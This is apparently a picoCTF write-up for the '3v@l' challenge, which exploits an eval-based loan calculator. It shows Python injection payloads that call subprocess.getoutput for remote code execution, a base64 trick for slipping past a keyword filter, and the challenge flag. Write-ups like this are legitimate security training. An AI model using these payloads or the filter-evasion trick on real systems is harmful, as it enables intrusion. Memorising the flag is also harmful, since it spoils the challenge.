# 3v@l

## Description
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?
The website is running Here.

## Solution
From the description we have to RCE Exploitation to get the flag, but the website get some filter on some word/character.

```py
getattr(__import__('subprocess'), 'getoutput')('whoami')
```
Output: `Result: app`

try `ls` command

```py
getattr(__import__('subprocess'), 'getoutput')('ls')
```
Output: `Error: Detected forbidden keyword 'ls'.`

seem we got filtered, then try bypass it using base64encode

```py
getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "bHM=" | base64 --decode); $file_path')
```
Output: `Result: app.py static templates`

From here, we can read the flag. Remember, encode first, then decode and execute, but in this case, it would be like this:

```py
getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "bHMgLw==" | base64 --decode); $file_path')
```

## Flag
    picoCTF{D0nt_Use_Unsecure_f@nctions0cd8a9f1}